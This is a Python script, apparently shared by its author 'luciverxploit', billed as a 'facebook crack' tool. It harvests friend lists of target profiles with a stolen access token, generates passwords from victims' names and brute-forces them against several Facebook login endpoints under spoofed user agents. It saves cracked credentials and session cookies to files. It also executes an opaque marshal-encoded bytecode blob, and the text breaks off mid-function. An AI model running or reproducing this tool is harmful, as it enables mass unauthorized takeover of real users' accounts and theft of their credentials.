"""HAY GUA LUCIVER KAMU SIAPA
JANGAN DI RICODE ATUH CAPE GUA
HARGAIN GUA"""

"""MODULE PENGINSTALAN"""
try:
    import requests, json, os, sys, random, datetime, time, re, uuid, subprocess, zlib, base64, marshal
    from time import time as tod
    from time import sleep
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as par
    from urllib import request
    from platform import platform
    from urllib.error import URLError
    ses = requests.Session()
    from rich.panel import Panel as panel
    from rich import print as prinst
    from rich.tree import Tree
except Exception as e:print(f"Error importing modules: {e}")
rr = random.randint;rc = random.choice

"""WARNA RICH"""
P = '\x1b[1;97m' ;M = '\x1b[1;91m';H = '\x1b[1;92m';K = '\x1b[1;93m' ;B = '\x1b[1;94m' ;U = '\x1b[1;95m';O = '\x1b[1;96m';N = '\x1b[0m';M2 = "[#FF0000]" ;H2 = "[#00FF00]" ;K2 = "[#FFFF00]" ;B2 = "[#00C8FF]" ;P2 = "[#FFFFFF]" 

"""TANGGAL BULAN DAN TAHUN"""
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = f'Live-{tgl}-{bln}-{thn}.txt'
cpc = f'Chek-{tgl}-{bln}-{thn}.txt'

"""WAKTU SEHARI-HARI"""
def waktu():
    now = datetime.datetime.now()
    hours = now.hour   
    if 4 <= hours < 12:timenow = f"selamat pagi  sekarang jam {hours}:{now.minute}"    
    elif 12 <= hours < 15:timenow = f"selamat siang  sekarang jam {hours}:{now.minute}"       
    elif 15 <= hours < 18:timenow = f"selamat sore  sekarang jam {hours}:{now.minute}"     
    else:
        timenow = f"selamat malam  sekarang jam {hours}:{now.minute}"
    return timenow
def Hapus():
	os.system("clear") 
	
def Author(): 
	print(f"\n{H}≥ author : luciverxploit")
def back():
	MenuLuciver()
	
"""LOGOKU ADA DI SINI"""	
def Gambar(): 
	Author();print(f"""{H}{waktu()}""");print(f"""{P} __ __ _____ _____ _____ 
|  |  |   __|     |     |{P}  author : {H}luciverxploit{K}
|-   -|__   |-   -| | | |{P}  tools  : {H}facebook crack{B}
|__|__|_____|_____|_|_|_|""")
ses = requests.Session()
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
akun,method=[],[]
ualuci, ualucipler = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]

"""MENU LOGIN SAYA"""
def Pertama():
	Hapus();Gambar();print(f"\n≥ {P}selamat datang di toolsku </>");print(f"\n{P}01.login cookie\n02.tidak login\n03.cek hasil eror guys");luci = input(f"\n</> pilih : ")			
	if luci == "1": Login()		
	elif luci == "2": Crack_file()		
	elif luci == "3": Result()		
	else:exit(print(f"≥ {M}pilih yang bener tod"))
			
"""TEMPAT SAYA LOGIN"""
def Login():
	print(f"\n{P}≥ silahkan masukan cookie yang bener tod \n     pake akun tumbal saja{P}");cok = input(f'≥ cookie : {H}')	
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"};link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok});find = re.findall('act=(.*?)&nav_source', link.text)		
		if len(find) == 0:print(f'{P}  </> cookie kamu invalid silahkan ngemis cookie terlebih dahulu');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok});took = re.search('(EAAB\w+)',xz.text).group(1);open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok);exit(f"{P}</> token: {H}{took}{P} \n</> cookie kamu aktif silahkan jalankan ulang")				
	except Exception as e:exit(e)
	
""" MENU TOOLS"""
def MenuLuciver():
	Hapus();Gambar()
	try:token = open('.tok.txt','r').read();cok = open('.cok.txt','r').read()		
	except (IOError,KeyError,FileNotFoundError): print(f'\n{P}</> COOKIE KAMU INVALID');time.sleep(2);os.system('clear');Pertama()		
	try:info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json();nama = info_datafb["name"];uidfb = info_datafb["id"]		
	except requests.exceptions.ConnectionError: exit(f"\n{P}</> KONEKSI ANDA BURUK{P}")		
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass;print(f"\n{P}≥ maaf akun anda kena checkpoint,harap ngemis dulu");time.sleep(2);Gambar();os.system('clear')		
	print();print(f"{H}01{K}.{P}crack uid publik fresh");print(f"{H}02{K}.{P}crack uid publik rame² fresh");print(f"{H}03{K}.{P}crack uid file fresh");print(f"{H}04{K}.{P}cek hasil anda");print(f"{H}00{K}.{M}logout")	
	luci = input(f'\n≥ {P}pilih: ')
	if luci == "1": print(f"{P}masukan uid target yang publik");idt = input(f'{M}≥ {P}publik target anda : ');dump(idt,"",{"cookie":cok},token);Mengatur()		
	elif luci == "2": Dump_Massal()		
	elif luci == "3": Crack_file()		
	elif luci == "4": Result()		
	elif luci == "0": os.system('rm -rf .tok.txt');os.system('rm -rf .cok.txt');print(f'\n berhasil keluar dan hapus cookie ');exit()		
	else:print(f"\n{M}≥ {K}ngga punya mata ya bang!!");time.sleep(3);back()		
		
"""DUMP ID PUBLIKNYA"""
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{M}≥ {P}sukses {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

"""DUMP ID RAME²"""
def Dump_Massal():
	try:token = open('.tok.txt','r').read();cok = open('.cok.txt','r').read()		
	except IOError:exit()		
	try:print(f"\n{M}≥ {P}jangan nyari yang private");jum = int(input(f'{M}≥ {P}ketik jumlah yang ingin di dump ? : '))		
	except ValueError:print(f'{M}≥ {P}input salah ');exit()		
	if jum<1 or jum>100:print(f'{M}≥ {P}kemungkinan akun private ');exit()		
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1;user_dump = input(f'{M}≥ {P}id terget '+str(jumlah_input)+' : ');uid.append(user_dump)		
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:sys.stdout.write(f"\r{M}≥ {P}mencoba dump,  {H}{len(id)} id...."),;sys.stdout.flush();id.append(x['id']+'|'+x['name'])					
				except:continue
		except (KeyError,IOError):pass			
		except requests.exceptions.ConnectionError:print(f'{M}≥ {P}koneksi sinyal tidak stabil ');exit()			
	try:Mengatur()		
	except requests.exceptions.ConnectionError:print('');print(f'{M}≥ {P}koneksi sinyal tidak stabil ');back()
		
"""CRACK KE FILE"""
def Crack_file():
	file = input(f"\n{M}≥ {P}masukan nama file kamu : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r{M}≥ {P}sedang menggeser merkurius,  {H}{len(id)}{P} id....{P}"),;sys.stdout.flush();id.append(data)			
	except FileNotFoundError:exit(f"≥ file tidak terbaca");Mengatur()
	
"""SETTING METODE"""
def Mengatur():
	print("") 
	print(f"{H}01{K}.{P}urutan untuk mengambil akun lama menuju baru");print(f"{H}02{K}.{P}urutan untuk mengambil akun baru menuju lama");print(f"{H}03{K}.{P}urutan untuk mengambil akun bebas dan random");meengatur_langit = input(f'\n{M}≥{P} pilih : ');print("")	
	if meengatur_langit == "1":
		for tua in sorted(id):uid2.append(tua)			
	elif meengatur_langit == "2":
		muda=[]
		for new in sorted(id):muda.append(new)			
		bcm=len(muda);bcmi=(bcm-1)		
		for xmud in range(bcm):uid2.append(muda[bcmi]);bcmi -=1			
	elif meengatur_langit == "3":
		for acak in id:xx = random.randint(0,len(uid2));uid2.insert(xx,acak)			
	else:print(f"{M}≥ jangan kosong.");exit()		
				
	print(f"{H}01{K}.{P}metode api ≥ {H}graph.facebook.com");print(f"{H}02{K}.{P}metode async ≥ {H}m.facebook.com");print(f"{H}03{K}.{P}metode valid ≥ {H}free.prod.facebook.com");print(f"{H}04{K}.{P}metode messenger ≥ {H}www.messengger.com");login_masuk_agamaku = input(f'\n{M}≥ {P}pilih : ');print("")	
	if login_masuk_agamaku == "1":method.append('Cepat')		
	elif login_masuk_agamaku == "2":method.append('Async')		
	elif login_masuk_agamaku == "3":method.append('Validate')		
	elif login_masuk_agamaku == "4":method.append('Lambat')		
	else:print(f"{M}≥ jangan kosong.");exit()
				
	print(f"{H}01{K}.{P}password yang sudah di tentukan");print(f"{H}02{K}.{P}password yang ingin di gabungkan");print(f"{H}03{K}.{P}password yang ingin di tambahkan");prabowo_presidenku = input(f'\n{M}≥ {P}pilih : ');print("")		
	if prabowo_presidenku == "1":Otomatis()		
	elif prabowo_presidenku == "2":Gabung()		
	elif prabowo_presidenku == "3":Manual()		
	else:print(f"{M}≥ jangan kosong.");exit()
		
		
""" PASSWORD OTOMATIS"""
def Otomatis():
	ua = input(f'{M}≥ {P}ingin menggunakan user agent ? {P}[{H}Ya{P}/{M}Tidak{P}] : ')
	if ua =="y":ualucipler.append('ualuci');mxc = input(f'{M}≥ {P}masukan useragent : ');ualuci.append(mxc)		
	if ua =="t":print(f"{M}≥ {P}sedang menggunakan user agent rakitan luciverxploit. {P}")		
	else:ualucipler.append('uasc')
	print();print(f"""{H}live {P}akan tersimpan di : {H}{okc}{P}\n{K}chek {P}akan tersimpan di : {K}{cpc}{P}\nmode pesawatnya jangan lupa mainkan biar tidak spam""")	
	with tred(max_workers=10) as LuciGanteng:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower();depan = nama.split(" ")[0];pasw = []			
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:pasw.append(nama);pasw.append(depan+"123");pasw.append(depan+"12345")						
				else:
					if len(depan)<3:pasw.append(nama);pasw.append(depan+"123");pasw.append(depan+"12345")						
					else:pasw.append(nama);pasw.append(depan+"123");pasw.append(depan+"12345")					
				if 'Api' in method:LuciGanteng.submit(_FIRE_,uid,pasw)					
				elif 'Async' in method:LuciGanteng.submit(_FWATER_,uid,pasw)					
				elif 'Validate' in method:LuciGanteng.submit(_VALDATE_,uid,pasw)					
				elif 'Messenger' in method:LuciGanteng.submit(_MSGR_,uid,pasw)					
				else:LuciGanteng.submit(_MSGR_,uid,pasw)					
			except:pass
	print("\r");exit(f"{M}≥ {P}sukses crack {H}{len(uid2)}{P} id,hasil live : {H}{ok} {P}chek : {K}{cp}{P}")
	
"""PASSWORD NYAMBUNG"""
def Gabung():
	pw_manual=input(f'\n{M}≥{P} masukan password : ');password_manual=pw_manual.split(',')	
	for xpw in password_manual:pwnya.append(xpw)		
	ua = input(f'{M}≥ {P}ingin menggunakan user agent ? {P}[{H}Ya{P}/{M}Tidak{P}] : ')
	if ua == "y":ualucipler.append('ualuci');mxc = input(f'{M}≥ {P}masukan useragent kamu : ');ualuci.append(mxc)		
	if ua == "t":print(f"{M}≥ {P}Langsung Bawaan LuciverXploit ")		
	else:ualucipler.append('uasc')
	print();print(f"""{H}live {P}akan tersimpan di : {H}{okc}{P}\n{K}chek {P}akan tersimpan di : {K}{cpc}{P}\nmode pesawatnya jangan lupa mainkan biar tidak spam""")	
	with tred(max_workers=35) as LuciGanteng:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower();depan = nama.split(" ")[0];pasw = []			
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:pasw.append(nama);pasw.append(depan+"123");pasw.append(depan+"1234");pasw.append(depan+"12345");pasw.append(depan+"321")						
				else:
					if len(depan)<3:pasw.append(nama)						
					else:pasw.append(nama);pasw.append(depan+"123");pasw.append(depan+"1234");pasw.append(depan+"12345");pasw.append(depan+"321")						
				for xpwd in pwnya:pasw.append(xpwd)					
				if 'Api' in method:LuciGanteng.submit(_FIRE_,uid,pasw)					
				elif 'Async' in method:LuciGanteng.submit(_FWATER_,uid,pasw)					
				elif 'Validate' in method:LuciGanteng.submit(_VALDATE_,uid,pasw)					
				elif 'Messenger' in method:LuciGanteng.submit(_MSGR_,uid,pasw)					
				else:LuciGanteng.submit(_MSGR_,uid,pasw)					
			except:pass
	print("\r")
	print(f"{M}≥ {P}sukses crack {H}{len(uid2)}{P} id,hasil live : {H}{ok} {P}chek : {K}{cp}{P}")

"""PASSWORD MANUAL"""
def Manual():
	pw_manual=input(f'\n{M}≥{P} masukan password : ');password_manual=pw_manual.split(',')	
	for xpw in password_manual:pwnya.append(xpw)		
	ua = input(f'{M}≥ {P}ingin menggunakan user agent ? {P}[{H}Ya{P}/{M}Tidak{P}] : ')
	if ua in ['y','Ya','ya','Y']:ualucipler.append('ualuci');mxc = input(f'{M}≥ {P}masukan useragent kamu : ');ualuci.append(mxc)		
	if ua in ['t','T','']:print(f"{P}{M}≥ {P}Langsung Bawaan LuciverXploit. {P}")		
	else:ualucipler.append('uasc') 
	print();print(f"""{H}live {P}akan tersimpan di : {H}{okc}{P}\n{K}chek {P}akan tersimpan di : {K}{cpc}{P}\nmode pesawatnya jangan lupa mainkan biar tidak spam""")	
	with tred(max_workers=30) as LuciGanteng:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower();depan = nama.split(" ");pasw = []			
			for xpwd in pwnya:pasw.append(xpwd)				
			if 'Api' in method:LuciGanteng.submit(_FIRE_,uid,pasw)			
			elif 'Async' in method:LuciGanteng.submit(_FWATER_,uid,pasw)				
			elif 'Validate' in method:LuciGanteng.submit(_VALDATE_,uid,pasw)				
			elif 'Messenger' in method:LuciGanteng.submit(_MSGR_,uid,pasw)				
			else:LuciGanteng.submit(_MSGR_,uid,pasw)				
	print("\r");exit(f"{M}≥ {P}sukses crack {H}{len(uid2)}{P} id,hasil live : {H}{ok} {P}chek : {K}{cp}{P}")
	
"""USER AGENT GUA"""
useragent = []
useragent2 = []
def api():
	rr = random.randint;rc = random.choice	
	return f"Dalvik/2.1.0 (Linux; U; Android 13; RMX3760 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/{str(rr(350,450))}.0.0.44.117;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{str(rr(410000000,599999999))};FBCR/Smartfren 100% untuk Indonesia;FBMF/realme;FBBD/realme;FBDV/RMX3760;FBSV/{str(rr(10,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;FBRV/0;] FBBK/1"
def ugen():
  rr = random.randint;rc = random.choice;androversi = random.choice(["15_4","14_3","13_5","14_5","13_4"]);luci28 = random.choice(["Y6MLQN","8G7LN3","2783VM","X35XFL","W5T30Y"]);luci2001 = f"Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))} Mobile Safari/537.36"  
  return rc([luci2001]) 
os.system("clear")
exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00\xf3p\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x00e\x01\x9b\x00d\x01e\x02\x9b\x00d\x02e\x01\x9b\x00d\x01e\x02\x9b\x00d\x03e\x01\x9b\x00d\x01e\x02\x9b\x00d\x04\x9d\x0c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x03\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x06S\x00)\x07c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3\xc4\x00\x00\x00\x97\x00|\x00d\x01z\x00\x00\x00D\x00]Y}\x01t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cZd\x00S\x00)\x03N\xfa\x01\ng\x9a\x99\x99\x99\x99\x99\xa9?)\x06\xda\x03sys\xda\x06stdout\xda\x05write\xda\x05flush\xda\x04time\xda\x05sleep)\x02\xda\x01u\xda\x01es\x02\x00\x00\x00  \xda\x00\xda\x07Lucianar\r\x00\x00\x00\x01\x00\x00\x00sS\x00\x00\x00\x80\x00\xd8\n\x0b\x88d\x89(\xd0\x01J\xd0\x01J\x80Q\x953\x94:\xd7\x13#\xd2\x13#\xa0A\xd1\x13&\xd4\x13&\xd0\x13&\xa5s\xa4z\xd7'7\xd2'7\xd1'9\xd4'9\xd0'9\xbd$\xbf*\xba*\xc0T\xd1:J\xd4:J\xd0:J\xd0:J\xd0\x01J\xd0\x01J\xf3\x00\x00\x00\x00u\x04\x00\x00\x00\xe2\x89\xa5 z&script ini di buat oleh luciverxploit\nz,jika ada yang menjual hubungi luciverxploit\nz0jangan lupa follow github luciverxploit yah guys\xe9\x02\x00\x00\x00N)\x05r\r\x00\x00\x00\xda\x01H\xda\x01Pr\x08\x00\x00\x00r\t\x00\x00\x00\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x13\x00\x00\x00\x01\x00\x00\x00s\xcb\x00\x00\x00\xf0\x03\x01\x01\x01\xf0\x02\x01\x01K\x01\xf0\x00\x01\x01K\x01\xf0\x00\x01\x01K\x01\xf0\x06\x00\x01\x08\x80\x07\x881\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\x90!\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\xb8A\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\xc01\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\xd0st\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\xd0z{\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\xf0\x00\x00\tn\x02\xf1\x00\x00\x01o\x02\xf4\x00\x00\x01o\x02\xf0\x00\x00\x01o\x02\xf0\x00\x00p\x02t\x02\xf7\x00\x00p\x02z\x02\xf2\x00\x00p\x02z\x02\xf0\x00\x00{\x02|\x02\xf1\x00\x00p\x02}\x02\xf4\x00\x00p\x02}\x02\xf0\x00\x00p\x02}\x02\xf0\x00\x00p\x02}\x02\xf0\x00\x00p\x02}\x02r\x0e\x00\x00\x00"))

"""METODE VALID"""
def _VALDATE_(uid,pasw):
	global loop,ok,cp;sys.stdout.write(f"\r{P}≥LuciverValidate {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),;sys.stdout.flush();ses = requests.Session()	
	for pw in pasw:
		try:
			if 'ualuci' in ualucipler: ua = ualuci[0]
			else:ua = ugen()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_FIRE_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			hd = {"Host": "free.prod.facebook.com","content-length": "479","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_FIRE_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}≥ {H}{uid}|{pw} ≥ luci-sukses{P}") 
				print(f"\r{P}≥ {H}{kuki};{ua}{P}")			
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}≥ {K}{uid}|{pw} ≥ luci-checkpoint{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1	

"""METODE ASYN"""
def _FWATER_(uid,pasw):
	global loop,ok,cp;sys.stdout.write(f"\r{P}≥ LuciverAsycn {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),;sys.stdout.flush();ses = requests.Session()	
	for pw in pasw:
		try:
			if 'ualuci' in ualucipler: ua = ualuci[0]
			else:ua = ugen()
			versi = re.search('Chrome/(\d+).', str(ua)).group(1)
			versi2 = f".0.{str(rr(1111,5999))}.{str(rr(45,150))}"
			link = ses.get("https://m.facebook.com/login.php?skip_FIRE_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": "true","had_password_prefilled": "true","is_smart_lock": "false","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),"bi_wvdp": str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),"pass": pw,"fb_dtsg":"","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
			hd2 = {"Host": "m.facebook.com","content-length": "2138","sec-ch-ua": '"Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="%s"'%(versi),"sec-ch-ua-mobile": "?1","user-agent": ua,"viewport-width": "421","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"sec-ch-ua-platform-version": '"10.0.0"',"x-asbd-id": "129477","dpr": "2.56875","sec-ch-ua-full-version-list": '"Not/A)Brand";v="99.0.0.0", "Samsung Internet";v="23.0.0.47", "Chromium";v="%s%s"'%(versi,versi2),"sec-ch-ua-model": '"Redmi Note 7"',"sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://m.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": 